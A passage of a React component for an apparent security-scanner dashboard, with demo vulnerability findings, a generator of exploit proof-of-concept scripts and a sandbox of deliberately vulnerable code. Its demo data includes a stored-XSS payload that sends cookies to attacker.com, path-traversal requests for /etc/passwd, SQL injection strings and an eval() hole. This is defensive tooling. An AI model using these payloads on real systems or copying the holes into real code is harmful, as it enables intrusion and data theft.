import { useState, useEffect, useRef } from "react"
import {
  X,
  ExternalLink,
  ChevronDown,
  Copy,
  Shield,
  Download,
  Bookmark,
  Send,
  Boxes,
  FileCode,
  File,
  Check,
  Activity,
  GitBranch,
  FolderOpen,
  Loader2,
  AlertTriangle,
  RefreshCw,
} from "lucide-react"
import { findingsApi } from "../api/client"

interface FindingsProps {
  onNavigate: (page: string, subTab?: string) => void
  findingsCount: number
  setFindingsCount: (count: number) => void
  initialTab?: "findings" | "sast" | "sca" | "threat-path" | "compliance"
}

interface Finding {
  id: string
  title: string
  severity: string
  category: string
  target: string
  parameter: string
  confidence: string
  status: string
  found: string
  description: string
  recommendation: string
  evidence: string
  notes?: string[]
}

const ALL_FINDINGS: Finding[] = [
  {
    id: "VLN-0247",
    title: "Server-side Path Traversal in File Export",
    severity: "Critical",
    category: "Path Traversal",
    target: "api.acmecorp.com",
    parameter: "file",
    confidence: "Confirmed",
    status: "Open",
    found: "Jul 26, 14:26",
    description: "The /export endpoint accepts a `file` parameter that is passed directly to a filesystem read operation without sanitization. An attacker can use `../` sequences to read arbitrary files from the server filesystem, including /etc/passwd and application secrets.",
    recommendation: "Validate and sanitize the `file` parameter against an allowlist of permitted filenames. Resolve the path and verify it remains within the intended directory using path.resolve() with a prefix check.",
    evidence: "GET /export?file=../../etc/passwd HTTP/1.1\nHost: api.acmecorp.com\n\nResponse: root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:...",
    notes: ["Alex Kim (Jul 26): Replayed the request manually via HTTP Repeater. Exposed /etc/passwd successfully."],
  },
  {
    id: "VLN-0246",
    title: "SQL Injection via user_id Parameter",
    severity: "Critical",
    category: "Injection",
    target: "api.acmecorp.com",
    parameter: "user_id",
    confidence: "Confirmed",
    status: "Open",
    found: "Jul 26, 14:24",
    description: "The user_id parameter in /api/users is concatenated directly into an SQL query without parameterization. A boolean-based blind SQL injection was confirmed, allowing enumeration of the database schema and potentially all user records.",
    recommendation: "Replace string concatenation with parameterized queries or prepared statements. Adopt an ORM that enforces parameterized inputs by default.",
    evidence: "GET /api/users?user_id=1' AND 1=1--\nResponse: 200 OK (user returned)\n\nGET /api/users?user_id=1' AND 1=2--\nResponse: 404 Not Found",
    notes: ["Security Scanner (Jul 26): Exploit proven automatically via blind differential parsing."],
  },
  {
    id: "VLN-0245",
    title: "IDOR on /admin/export Endpoint",
    severity: "High",
    category: "Access Control",
    target: "admin.acmecorp.com",
    parameter: "report_id",
    confidence: "Confirmed",
    status: "Open",
    found: "Jul 25, 11:14",
    description: "The report download endpoint does not verify that the authenticated user is the owner of the requested report. By enumerating the report_id parameter, a user can download reports belonging to other organizations.",
    recommendation: "Implement ownership checks on all resource access. Use indirect references (UUIDs not sequential IDs) and enforce authorization at the data access layer.",
    evidence: "GET /admin/export?report_id=4821\nAuthorization: Bearer <user_A_token>\nResponse: 200 OK — PDF report belonging to Org B returned",
    notes: [],
  },
  {
    id: "VLN-0244",
    title: "Stored XSS in Profile Description",
    severity: "High",
    category: "XSS",
    target: "app.acmecorp.com",
    parameter: "description",
    confidence: "Confirmed",
    status: "In Review",
    found: "Jul 25, 09:41",
    description: "The profile description field accepts and stores unsanitized HTML. When viewed by other users, injected script executes in their browser context, enabling session hijacking or credential theft.",
    recommendation: "Apply output encoding when rendering user-supplied content. Use a Content Security Policy header to restrict script execution. Sanitize input server-side using an allowlist-based HTML parser.",
    evidence: 'POST /api/profile\n{"description": "<img src=x onerror=fetch(`https://attacker.com/?c=`+document.cookie)>"}\nResult: Script executes on profile view',
    notes: ["Alex Kim (Jul 25): Ticket opened in JIRA (SEC-2391). Assigned to frontend team."],
  },
  {
    id: "VLN-0243",
    title: "Reflected XSS in Search Parameter",
    severity: "High",
    category: "XSS",
    target: "app.acmecorp.com",
    parameter: "q",
    confidence: "Confirmed",
    status: "Open",
    found: "Jul 25, 09:12",
    description: "The search query parameter 'q' is reflected directly in the search results page without proper HTML encoding. A malicious link could execute arbitrary scripts in the context of the user's session.",
    recommendation: "HTML-encode the query input before reflecting it back in the response body. Use framework-level escaping mechanism.",
    evidence: "GET /search?q=<script>alert(1)</script> HTTP/1.1\nResponse: <p>No results for <script>alert(1)</script></p>",
    notes: [],
  },
  {
    id: "VLN-0242",
    title: "Broken Access on /api/profile/update",
    severity: "Medium",
    category: "Access Control",
    target: "app.acmecorp.com",
    parameter: "email",
    confidence: "Suspected",
    status: "Open",
    found: "Jul 24, 18:22",
    description: "The user profile update endpoint lacks CSRF checks or same-site controls, making it susceptible to cross-site request forgery attacks that could modify client accounts.",
    recommendation: "Implement double-submit cookie validation or unique session anti-CSRF token verification on state-changing requests.",
    evidence: "POST /api/profile/update HTTP/1.1\n(No Anti-CSRF Headers parsed in headers list)",
    notes: [],
  },
  {
    id: "VLN-0241",
    title: "Insecure JWT Signature Algorithm Allowed",
    severity: "Medium",
    category: "Cryptography",
    target: "auth.acmecorp.com",
    parameter: "header",
    confidence: "Confirmed",
    status: "Open",
    found: "Jul 23, 14:02",
    description: "The token validation system accepts JWT tokens signed with 'none' or symmetric HS256 instead of RS256, allowing token forgery attacks under specific network conditions.",
    recommendation: "Configure JWT library to explicitly specify allowed signing algorithms and reject 'none' as header type.",
    evidence: "POST /auth/callback\nToken: eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0...",
    notes: [],
  },
  {
    id: "VLN-0240",
    title: "TLS 1.0 Cipher Suites Accepted",
    severity: "Low",
    category: "Cryptography",
    target: "api.acmecorp.com",
    parameter: "TLS",
    confidence: "Confirmed",
    status: "Open",
    found: "Jul 22, 10:15",
    description: "The server accepts connection handshakes using outdated TLS 1.0 protocol, which is susceptible to credential interception via BEAST and POODLE attacks.",
    recommendation: "Deactivate TLS 1.0 and TLS 1.1 support. Restrict SSL configuration to TLS 1.2 and TLS 1.3.",
    evidence: "SSL Connection: Server selected TLS_RSA_WITH_AES_128_CBC_SHA (TLS 1.0 fallback)",
    notes: [],
  },
]

const SEV_CONFIG: Record<string, { text: string; bg: string; border: string }> = {
  Critical: { text: "text-critical", bg: "bg-critical/10", border: "border-critical/25" },
  High: { text: "text-high", bg: "bg-high/10", border: "border-high/25" },
  Medium: { text: "text-medium", bg: "bg-medium/10", border: "border-medium/25" },
  Low: { text: "text-low", bg: "bg-low/10", border: "border-low/25" },
}

const STATUS_CONFIG: Record<string, string> = {
  Open: "text-critical bg-critical/5 border-critical/15",
  "In Review": "text-medium bg-medium/5 border-medium/15",
  Fixed: "text-emerald bg-emerald/5 border-emerald/15",
  "Risk Accepted": "text-ink-3 bg-elevated border-border",
}

export default function Findings({
  onNavigate,
  findingsCount,
  setFindingsCount,
  initialTab,
}: FindingsProps) {
  const [activeTab, setActiveTab] = useState<"findings" | "sast" | "sca" | "threat-path" | "compliance">(initialTab || "findings")

  useEffect(() => {
    if (initialTab) {
      setActiveTab(initialTab)
    }
  }, [initialTab])

  const [findingsList, setFindingsList] = useState<Finding[]>(ALL_FINDINGS)
  const [selected, setSelected] = useState<Finding | null>(null)
  const [loadingFindings, setLoadingFindings] = useState(false)

  // Try to load real findings from backend; fall back to demo data
  useEffect(() => {
    let cancelled = false
    const load = async () => {
      setLoadingFindings(true)
      try {
        const apiFindings = await findingsApi.list()
        if (!cancelled && apiFindings.length > 0) {
          // Map API shape → local Finding shape
          const mapped: Finding[] = apiFindings.map((f) => ({
            id: f.id,
            title: f.title,
            severity: f.severity,
            category: f.category,
            target: f.target,
            parameter: f.parameter,
            confidence: f.confidence,
            status: f.status,
            found: new Date(f.found_at).toLocaleString(),
            description: "",
            recommendation: "",
            evidence: "",
            notes: [],
          }))
          setFindingsList(mapped)
          setFindingsCount(mapped.length)
        }
      } catch {
        // Backend not running — keep demo data
      } finally {
        if (!cancelled) setLoadingFindings(false)
      }
    }
    load()
    return () => { cancelled = true }
  }, [])
  
  // Filters
  const [filterSev, setFilterSev] = useState<string>("All")
  const [searchQuery, setSearchQuery] = useState("")

  // Drawer comment note state
  const [newNote, setNewNote] = useState("")

  // Exploit PoC state
  const [pocLang, setPocLang] = useState<"python" | "curl" | "go">("python")
  const [copiedPoc, setCopiedPoc] = useState(false)

  const getPoCScript = (finding: Finding, lang: "python" | "curl" | "go") => {
    const host = finding.target.startsWith("http") ? finding.target : `https://${finding.target}`
    const param = finding.parameter || "id"
    if (finding.category === "Path Traversal") {
      if (lang === "python") {
        return `import requests\n\nurl = "${host}/export"\nparams = {"${param}": "../../../../etc/passwd"}\n\nprint("[*] Sending traversal payload...")\nresponse = requests.get(url, params=params)\nprint(f"[+] Status Code: {response.status_code}")\nprint(response.text[:200])`
      } else if (lang === "curl") {
        return `curl -G "${host}/export" \\\n  --data-urlencode "${param}=../../../../etc/passwd"`
      } else {
        return `package main\n\nimport (\n\t"fmt"\n\t"io"\n\t"net/http"\n)\n\nfunc main() {\n\tresp, _ := http.Get("${host}/export?${param}=../../../../etc/passwd")\n\tdefer resp.Body.Close()\n\tbody, _ := io.ReadAll(resp.Body)\n\tfmt.Println(string(body))\n}`
      }
    }
    if (finding.category === "Injection") {
      if (lang === "python") {
        return `import requests\n\nurl = "${host}/api/users"\npayload = "1' OR '1'='1"\nparams = {"${param}": payload}\n\nprint("[*] Executing Boolean Blind SQL injection...")\nresponse = requests.get(url, params=params)\nif "admin" in response.text:\n    print("[+] Vulnerability Confirmed: Database extracted successfully!")\nelse:\n    print("[-] Exploit failed or payload filtered.")`
      } else if (lang === "curl") {
        return `curl "${host}/api/users?${param}=1%27+OR+%271%27%3D%271"`
      } else {
        return `package main\n\nimport (\n\t"fmt"\n\t"io"\n\t"net/http"\n)\n\nfunc main() {\n\turl := "${host}/api/users?${param}=1%27+OR+%271%27%3D%271"\n\tresp, _ := http.Get(url)\n\tdefer resp.Body.Close()\n\tfmt.Println("Exploit request sent successfully")\n}`
      }
    }
    // Default fallback
    if (lang === "python") {
      return `import requests\n\nurl = "${host}"\nheaders = {"User-Agent": "VulnGuard-Exploit-PoC"}\n\nprint("[*] Probing vulnerability point...")\nresponse = requests.get(url, headers=headers)\nprint(f"[+] Response Status: {response.status_code}")`
    } else if (lang === "curl") {
      return `curl -X GET "${host}" \\\n  -H "User-Agent: VulnGuard-Exploit-PoC"`
    } else {
      return `package main\n\nimport (\n\t"net/http"\n\t"fmt"\n)\n\nfunc main() {\n\tclient := &http.Client{}\n\treq, _ := http.NewRequest("GET", "${host}", nil)\n\treq.Header.Set("User-Agent", "VulnGuard-Exploit-PoC")\n\tresp, _ := client.Do(req)\n\tfmt.Println(resp.StatusCode)\n}`
    }
  }

  // Triage Action Handlers
  const handleTriageStatus = (id: string, newStatus: "Fixed" | "Risk Accepted") => {
    let decremented = false
    const updated = findingsList.map((f) => {
      if (f.id === id) {
        if (f.status !== "Fixed" && f.status !== "Risk Accepted") {
          decremented = true
        }
        return { ...f, status: newStatus }
      }
      return f
    })
    setFindingsList(updated)
    if (selected?.id === id) {
      setSelected({ ...selected, status: newStatus })
    }
    if (decremented) {
      setFindingsCount(findingsCount - 1)
    }
  }

  const handleAddNote = (id: string) => {
    if (!newNote.trim()) return
    const updated = findingsList.map((f) => {
      if (f.id === id) {
        const notes = f.notes ? [...f.notes, `Alex Kim (Today): ${newNote}`] : [`Alex Kim (Today): ${newNote}`]
        return { ...f, notes }
      }
      return f
    })
    setFindingsList(updated)
    if (selected?.id === id) {
      setSelected({
        ...selected,
        notes: selected.notes ? [...selected.notes, `Alex Kim (Today): ${newNote}`] : [`Alex Kim (Today): ${newNote}`],
      })
    }
    setNewNote("")
  }

  // Filter list
  const filtered = findingsList.filter((f) => {
    const matchSev = filterSev === "All" || f.severity === filterSev
    const matchQuery =
      f.title.toLowerCase().includes(searchQuery.toLowerCase()) ||
      f.id.toLowerCase().includes(searchQuery.toLowerCase()) ||
      f.target.toLowerCase().includes(searchQuery.toLowerCase())
    return matchSev && matchQuery
  })

  return (
    <div className="flex flex-col h-full overflow-hidden bg-canvas">
      {/* Tab Navigation */}
      <div className="flex border-b border-border bg-panel px-4 shrink-0 justify-between items-center">
        <div className="flex gap-1">
          <button
            onClick={() => setActiveTab("findings")}
            className={`flex items-center gap-1.5 px-4 py-2.5 text-xs font-semibold border-b-2 -mb-px transition-colors ${
              activeTab === "findings" ? "border-accent text-ink" : "border-transparent text-ink-3 hover:text-ink-2"
            }`}
          >
            <Shield size={13} className={activeTab === "findings" ? "text-accent" : "text-ink-3"} />
            Vulnerability Findings
          </button>
          <button
            onClick={() => setActiveTab("sast")}
            className={`flex items-center gap-1.5 px-4 py-2.5 text-xs font-semibold border-b-2 -mb-px transition-colors ${
              activeTab === "sast" ? "border-accent text-ink" : "border-transparent text-ink-3 hover:text-ink-2"
            }`}
          >
            <FileCode size={13} className={activeTab === "sast" ? "text-accent" : "text-ink-3"} />
            SAST AST Sandbox
          </button>
          <button
            onClick={() => setActiveTab("sca")}
            className={`flex items-center gap-1.5 px-4 py-2.5 text-xs font-semibold border-b-2 -mb-px transition-colors ${
              activeTab === "sca" ? "border-accent text-ink" : "border-transparent text-ink-3 hover:text-ink-2"
            }`}
          >
            <Boxes size={13} className={activeTab === "sca" ? "text-accent" : "text-ink-3"} />
            SCA Dependency Scanner
          </button>
          <button
            onClick={() => setActiveTab("threat-path")}
            className={`flex items-center gap-1.5 px-4 py-2.5 text-xs font-semibold border-b-2 -mb-px transition-colors ${
              activeTab === "threat-path" ? "border-accent text-ink" : "border-transparent text-ink-3 hover:text-ink-2"
            }`}
          >
            <Activity size={13} className={activeTab === "threat-path" ? "text-accent" : "text-ink-3"} />
            Attack Path Visualizer
          </button>
          <button
            onClick={() => setActiveTab("compliance")}
            className={`flex items-center gap-1.5 px-4 py-2.5 text-xs font-semibold border-b-2 -mb-px transition-colors ${
              activeTab === "compliance" ? "border-accent text-ink" : "border-transparent text-ink-3 hover:text-ink-2"
            }`}
          >
            <FolderOpen size={13} className={activeTab === "compliance" ? "text-accent" : "text-ink-3"} />
            Compliance Matrix
          </button>
        </div>
        <span className="text-[10px] font-mono text-ink-3 pr-2">Database v2.4.9</span>
      </div>

      <div className="flex-1 min-h-0">
        {/* ────────────────────────────────────────────────────────
            TAB: VULNERABILITY FINDINGS LIST
            ──────────────────────────────────────────────────────── */}
        {activeTab === "findings" && (
          <div className="flex h-full min-h-0 overflow-hidden">
            <div className={`flex flex-col overflow-hidden transition-all duration-200 ${selected ? "w-[50%]" : "w-full"}`}>
              {/* Toolbar */}
              <div className="px-5 py-3 border-b border-border flex items-center gap-3 bg-panel/30">
                <h1 className="text-ink text-sm font-semibold shrink-0">Vulnerabilities</h1>
                <div className="flex items-center gap-1.5 ml-2">
                  {["All", "Critical", "High", "Medium", "Low"].map((s) => (
                    <button
                      key={s}
                      onClick={() => setFilterSev(s)}
                      className={`px-2 py-0.5 rounded text-[10px] font-semibold transition-colors ${
                        filterSev === s ? "bg-accent/15 text-accent border border-accent/20" : "text-ink-3 hover:text-ink-2"
                      }`}
                    >
                      {s}
                    </button>
                  ))}
                </div>
                <div className="flex-1 max-w-[200px] flex items-center gap-2 bg-canvas border border-border rounded px-2.5 py-1 ml-auto">
                  <input
                    type="text"
                    value={searchQuery}
                    onChange={(e) => setSearchQuery(e.target.value)}
                    placeholder="Search findings ID, target..."
                    className="bg-transparent text-ink text-[11px] placeholder:text-ink-3 flex-1"
                  />
                </div>

                {/* Bulk Actions */}
                <div className="flex gap-2">
                  <button
                    onClick={() => {
                      alert("Exporting CSV report bundle...")
                    }}
                    className="flex items-center gap-1 px-2.5 py-1 bg-elevated border border-border hover:border-border-hi rounded text-ink-2 hover:text-ink text-[10px] font-semibold transition-colors"
                  >
                    <Download size={10} />
                    <span>Export</span>
                  </button>
                </div>
              </div>

              {/* Table */}
              <div className="flex-1 overflow-y-auto">
                <table className="w-full">
                  <thead className="sticky top-0 bg-surface z-10">
                    <tr className="border-b border-border bg-[#0b0f17] text-[10px] font-semibold uppercase tracking-wider text-ink-3">
                      <th className="px-4 py-2 text-left pl-5">ID</th>
                      <th className="px-4 py-2 text-left">Severity</th>
                      <th className="px-4 py-2 text-left">Title</th>
                      <th className="px-4 py-2 text-left">Category</th>
                      <th className="px-4 py-2 text-left">Status</th>
                      <th className="px-4 py-2 text-left">Detected</th>
                    </tr>
                  </thead>
                  <tbody className="divide-y divide-border/60">
                    {filtered.map((f) => {
                      const sev = SEV_CONFIG[f.severity]
                      const sta = STATUS_CONFIG[f.status]
                      return (
                        <tr
                          key={f.id}
                          onClick={() => setSelected(selected?.id === f.id ? null : f)}
                          className={`cursor-pointer transition-colors ${
                            selected?.id === f.id ? "bg-accent/5" : "hover:bg-elevated/20"
                          }`}
                        >
                          <td className="pl-5 pr-4 py-3 text-ink-3 text-xs font-mono font-medium">{f.id}</td>
                          <td className="px-4 py-3">
                            <span className={`px-1.5 py-0.5 rounded border text-[9px] font-bold tracking-wide uppercase ${sev.text} ${sev.bg} ${sev.border}`}>
                              {f.severity}
                            </span>
                          </td>
                          <td className="px-4 py-3 text-ink text-xs font-semibold max-w-[260px]">
                            <p className="truncate">{f.title}</p>
                            <p className="text-ink-3 text-[10px] font-mono truncate mt-0.5">{f.target}</p>
                          </td>
                          <td className="px-4 py-3 text-ink-2 text-xs font-mono">{f.category}</td>
                          <td className="px-4 py-3">
                            <span className={`px-2 py-0.5 rounded text-[10px] font-semibold border ${sta}`}>
                              {f.status}
                            </span>
                          </td>
                          <td className="px-4 py-3 text-ink-3 text-[10px] font-mono">{f.found}</td>
                        </tr>
                      )
                    })}
                  </tbody>
                </table>
              </div>
            </div>

            {/* Side Drawer Detail */}
            {selected && (
              <div className="flex-1 border-l border-border flex flex-col overflow-hidden bg-card">
                <div className="flex items-start justify-between px-5 py-4 border-b border-border shrink-0 bg-panel/30">
                  <div className="flex-1 min-w-0 pr-4">
                    <div className="flex items-center gap-2 mb-2">
                      <span className={`px-1.5 py-0.5 rounded border text-[9px] font-bold tracking-wide uppercase ${SEV_CONFIG[selected.severity].text} ${SEV_CONFIG[selected.severity].bg} ${SEV_CONFIG[selected.severity].border}`}>
                        {selected.severity}
                      </span>
                      <span className="text-ink-3 text-xs font-mono">{selected.id}</span>
                    </div>
                    <h2 className="text-ink text-sm font-semibold leading-snug">{selected.title}</h2>
                  </div>
                  <button onClick={() => setSelected(null)} className="text-ink-3 hover:text-ink transition-colors">
                    <X size={15} />
                  </button>
                </div>

                {/* Drawer Body */}
                <div className="flex-1 overflow-y-auto p-5 space-y-4">
                  <div className="grid grid-cols-2 gap-3 text-xs font-mono">
                    {[
                      { label: "Target", value: selected.target },
                      { label: "Parameter", value: selected.parameter },
                      { label: "Category", value: selected.category },
                      { label: "Confidence", value: selected.confidence },
                    ].map((m) => (
                      <div key={m.label} className="bg-canvas border border-border rounded p-2.5">
                        <span className="text-ink-3 text-[9px] uppercase tracking-wider block mb-1">{m.label}</span>
                        <span className="text-ink text-xs font-bold">{m.value}</span>
                      </div>
                    ))}
                  </div>

                  <DrawerSection title="Description" icon={<Shield size={12} />}>
                    <p className="text-ink-2 text-xs leading-relaxed">{selected.description}</p>
                  </DrawerSection>

                  <DrawerSection title="Evidence" icon={<Copy size={12} />}>
                    <pre className="bg-canvas border border-border/80 rounded p-3 text-ink-2 text-[10px] font-mono leading-5 whitespace-pre-wrap overflow-x-auto">
                      {selected.evidence}
                    </pre>
                  </DrawerSection>

                  <DrawerSection title="Exploit PoC Script" icon={<FileCode size={12} />}>
                    <div className="space-y-3 font-sans">
                      <div className="flex justify-between items-center bg-canvas/30 p-1 border border-border rounded">
                        <div className="flex gap-1.5">
                          {(["python", "curl", "go"] as const).map((lang) => (
                            <button
                              key={lang}
                              onClick={() => setPocLang(lang)}
                              className={`px-2 py-0.5 rounded text-[10px] font-mono font-semibold transition-colors uppercase ${
                                pocLang === lang ? "bg-accent text-white" : "text-ink-3 hover:text-ink-2"
                              }`}
                            >
                              {lang}
                            </button>
                          ))}
                        </div>
                        <button
                          onClick={() => {
                            const script = getPoCScript(selected, pocLang)
                            navigator.clipboard.writeText(script)
                            setCopiedPoc(true)
                            setTimeout(() => setCopiedPoc(false), 1500)
                          }}
                          className="flex items-center gap-1 px-2.5 py-0.5 bg-accent/10 border border-accent/20 hover:border-accent/30 text-accent rounded text-[10px] font-semibold transition-colors"
                        >
                          <Copy size={10} />
                          <span>{copiedPoc ? "Copied!" : "Copy"}</span>
                        </button>
                      </div>
                      <pre className="bg-canvas border border-border/80 rounded p-3 text-ink-2 text-[10px] font-mono leading-5 whitespace-pre overflow-x-auto">
                        {getPoCScript(selected, pocLang)}
                      </pre>
                    </div>
                  </DrawerSection>

                  <DrawerSection title="Audit & Triage Timeline" icon={<Bookmark size={12} />}>
                    <div className="space-y-2">
                      {selected.notes && selected.notes.map((note, idx) => (
                        <div key={idx} className="bg-canvas border border-border/40 p-2 rounded text-[10px] font-mono text-ink-2 leading-relaxed">
                          {note}
                        </div>
                      ))}
                      <div className="flex gap-2 mt-2">
                        <input
                          type="text"
                          placeholder="Add triaging audit note..."
                          value={newNote}
                          onChange={(e) => setNewNote(e.target.value)}
                          className="flex-1 bg-canvas border border-border rounded px-2.5 py-1 text-ink text-xs font-sans"
                        />
                        <button
                          onClick={() => handleAddNote(selected.id)}
                          className="px-3 py-1 bg-accent text-white rounded text-xs hover:bg-accent/90"
                        >
                          <Send size={11} />
                        </button>
                      </div>
                    </div>
                  </DrawerSection>
                </div>

                {/* Drawer Footer Actions */}
                <div className="border-t border-border px-5 py-3 flex gap-2 shrink-0 bg-panel/30">
                  <button
                    onClick={() => handleTriageStatus(selected.id, "Fixed")}
                    className="px-3 py-1.5 bg-emerald/10 border border-emerald/20 hover:bg-emerald/15 rounded text-emerald text-xs font-semibold transition-colors"
                  >
                    Mark Fixed
                  </button>
                  <button
                    onClick={() => handleTriageStatus(selected.id, "Risk Accepted")}
                    className="px-3 py-1.5 bg-elevated border border-border hover:border-border-hi rounded text-ink-2 text-xs font-semibold transition-colors"
                  >
                    Accept Risk
                  </button>
                  <button
                    onClick={() => {
                      // Forward to Repeater
                      onNavigate("manual-testing")
                    }}
                    className="px-3 py-1.5 bg-accent/15 border border-accent/20 hover:bg-accent/25 rounded text-accent text-xs font-semibold transition-colors flex items-center gap-1 ml-auto"
                  >
                    Send to Repeater
                    <ExternalLink size={11} />
                  </button>
                </div>
              </div>
            )}
          </div>
        )}

        {/* ────────────────────────────────────────────────────────
            TAB: SAST AST SANDBOX
            ──────────────────────────────────────────────────────── */}
        {activeTab === "sast" && <SastSandbox />}

        {/* ────────────────────────────────────────────────────────
            TAB: SCA DEPENDENCY SCANNER
            ──────────────────────────────────────────────────────── */}
        {activeTab === "sca" && <ScaScanner />}

        {/* ────────────────────────────────────────────────────────
            TAB: ATTACK PATH VISUALIZER
            ──────────────────────────────────────────────────────── */}
        {activeTab === "threat-path" && <ThreatPathVisualizer />}

        {/* ────────────────────────────────────────────────────────
            TAB: COMPLIANCE MATRIX
            ──────────────────────────────────────────────────────── */}
        {activeTab === "compliance" && (
          <ComplianceMatrix
            setActiveTab={setActiveTab}
            setSelected={setSelected}
          />
        )}
      </div>
    </div>
  )
}

// ────────────────────────────────────────────────────────
// UPGRADED INTERACTIVE SAST IDE COMPONENT
// ────────────────────────────────────────────────────────
interface SASTIssue {
  line: number
  type: string
  severity: string
  message: string
  cwe: string
  remediation: string
  fixText: string
}

interface SASTFile {
  name: string
  path: string
  code: string
  issues: SASTIssue[]
  fixedCode: string
}

const SAST_FILES: Record<string, SASTFile> = {
  "controllers/app.js": {
    name: "app.js",
    path: "controllers/app.js",
    code: `const express = require('express');
const app = express();
const db = require('../config/db');

app.post('/api/run-code', (req, res) => {
  // CRITICAL: eval executes raw request arguments!
  const output = eval(req.body.code); 
  
  // SQL Injection via query parameters
  const query = "SELECT * FROM users WHERE user_id = '" + req.query.id + "'";
  db.query(query, (err, result) => {
    res.json({ output, result });
  });
});`,
    issues: [
      {
        line: 7,
        type: "Remote Code Execution",
        severity: "Critical",
        message: "Raw parameter passed directly to eval() executor. High risk of arbitrary code execution.",
        cwe: "CWE-94",
        remediation: "Remove eval() entirely. Use a VM2 sandbox environment or strict validation checks if dynamic script evaluation is required.",
        fixText: `  // Fixed: Executing in a safe sandbox environment or removing eval
  const output = "Execution disallowed";`
      },
      {
        line: 10,
        type: "SQL Injection",
        severity: "High",
        message: "Direct string concatenation detected inside SQL query statement.",
        cwe: "CWE-89",
        remediation: "Use parameterized queries or prepared statements instead of string concatenation.",
        fixText: `  // Fixed: Parameterized query statement
  const query = "SELECT * FROM users WHERE user_id = ?";
  db.query(query, [req.query.id], (err, result) => {`
      }
    ],
    fixedCode: `const express = require('express');
const app = express();
const db = require('../config/db');

app.post('/api/run-code', (req, res) => {
  // Fixed: Executing in a safe sandbox environment or removing eval
  const output = "Execution disallowed";
  
  // Fixed: Parameterized query statement
  const query = "SELECT * FROM users WHERE user_id = ?";
  db.query(query, [req.query.id], (err, result) => {
    res.json({ output, result });
  });
});`
  },
  "config/db.js": {
    name: "db.js",
    path: "config/db.js",
    code: `// Hardcoded Database access secrets
const dbConfig = {
  host: "db.acmecorp.internal",
  user: "ciso_admin",
  // Entropy alert: High confidence JWT & AWS Access Keys
  awsAccessKey: "AKIAIOSFODNN7EXAMPLE",
  awsSecretKey: "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",
  jwtSecretToken: "s3cr3t-t0k3n-9876543210-abcdefgh"
};`,
    issues: [
      {
        line: 6,
        type: "Entropy Secret Leak",
        severity: "Critical",
        message: "Found high entropy signature matching AWS Access Key identifier.",
        cwe: "CWE-798",
        remediation: "Avoid hardcoding AWS Credentials. Pull configuration settings from process.env or AWS Secret Manager.",
        fixText: `  awsAccessKey: process.env.AWS_ACCESS_KEY_ID,`
      },
      {
        line: 7,
        type: "Entropy Secret Leak",
        severity: "Critical",
        message: "Found high entropy secret matching AWS Signature Token key.",
        cwe: "CWE-798",
        remediation: "Avoid hardcoding AWS Credentials. Pull configuration settings from process.env or AWS Secret Manager.",
        fixText: `  awsSecretKey: process.env.AWS_SECRET_ACCESS_KEY,`
      }
    ],
    fixedCode: `// Hardcoded Database access secrets
const dbConfig = {
  host: "db.acmecorp.internal",
  user: "ciso_admin",
  // Fixed: Loaded from environment configurations
  awsAccessKey: process.env.AWS_ACCESS_KEY_ID,
  awsSecretKey: process.env.AWS_SECRET_ACCESS_KEY,
  jwtSecretToken: process.env.JWT_SECRET_KEY
};`
  },
  "package.json": {
    name: "package.json",
    path: "package.json",
    code: `{
  "name": "acmecorp-gateway",
  "dependencies": {
    "lodash": "4.17.15",
    "minimist": "1.2.0",
    "axios": "0.21.1",
    "express": "4.15.2"
  }
}`,
    issues: [
      {
        line: 4,
        type: "Outdated Dependency",
        severity: "Critical",
        message: "lodash 4.17.15 is vulnerable to Prototype Pollution (CVE-2020-8203).",
        cwe: "CWE-400",
        remediation: "Upgrade lodash to >= 4.17.21 in package.json.",
        fixText: `    "lodash": "4.17.21",`
      },
      {
        line: 6,
        type: "Outdated Dependency",
        severity: "High",
        message: "axios 0.21.1 is vulnerable to SSRF (CVE-2021-3749).",
        cwe: "CWE-918",
        remediation: "Upgrade axios to >= 0.21.2 in package.json.",
        fixText: `    "axios": "0.21.2",`
      }
    ],
    fixedCode: `{
  "name": "acmecorp-gateway",
  "dependencies": {
    "lodash": "4.17.21",
    "minimist": "1.2.6",
    "axios": "0.21.2",
    "express": "4.17.2"
  }
}`
  }
}

function SastSandbox() {
  const [selectedFile, setSelectedFile] = useState<string>("controllers/app.js")
  const [hoveredLine, setHoveredLine] = useState<number | null>(null)
  const [fixedState, setFixedState] = useState<Record<string, boolean>>({})
  const [viewMode, setViewMode] = useState<"code" | "diff">("code")
  
  const currentFile = SAST_FILES[selectedFile]
  const isFileFixed = fixedState[selectedFile] || false

  const handleApplyFix = () => {
    setFixedState(prev => ({ ...prev, [selectedFile]: true }))
    setViewMode("code")
  }

  const handleReset = () => {
    setFixedState(prev => ({ ...prev, [selectedFile]: false }))
    setViewMode("code")
  }

  const lines = currentFile.code.split("\n")
  const fixedLines = currentFile.fixedCode.split("\n")

  return (
    <div className="flex h-full min-h-0 overflow-hidden bg-canvas">
      {/* File Tree Explorer (Left Sidebar) */}
      <div className="w-[220px] shrink-0 border-r border-border bg-[#0a0d16] flex flex-col min-h-0">
        <div className="p-4 border-b border-border flex items-center justify-between bg-panel/30">
          <span className="text-ink-2 text-xs font-semibold uppercase tracking-wider">File Explorer</span>
          <span className="text-[10px] font-mono text-accent">3 Vulnerable</span>
        </div>
        <div className="flex-1 overflow-y-auto p-2.5 space-y-1 text-xs">
          {/* Mock directory controllers */}
          <div>
            <div className="flex items-center gap-1.5 text-ink-3 py-1 font-semibold">
              <FolderOpen size={13} className="text-accent" />
              <span>controllers</span>
            </div>
            <div className="pl-4 space-y-0.5">
              <button
                onClick={() => { setSelectedFile("controllers/app.js"); setHoveredLine(null); }}
                className={`w-full text-left flex items-center justify-between px-2 py-1.5 rounded transition-colors ${
                  selectedFile === "controllers/app.js" ? "bg-accent/15 text-accent font-semibold" : "text-ink-2 hover:bg-elevated/20"
                }`}
              >
                <div className="flex items-center gap-1.5 truncate">
                  <File size={12} className={selectedFile === "controllers/app.js" ? "text-accent" : "text-ink-3"} />
                  <span className="truncate">app.js</span>
                </div>
                {!fixedState["controllers/app.js"] && (
                  <span className="w-1.5 h-1.5 rounded-full bg-critical shrink-0" />
                )}
              </button>
            </div>
          </div>

          {/* Mock directory config */}
          <div>
            <div className="flex items-center gap-1.5 text-ink-3 py-1 font-semibold">
              <FolderOpen size={13} className="text-accent" />
              <span>config</span>
            </div>
            <div className="pl-4 space-y-0.5">
              <button
                onClick={() => { setSelectedFile("config/db.js"); setHoveredLine(null); }}
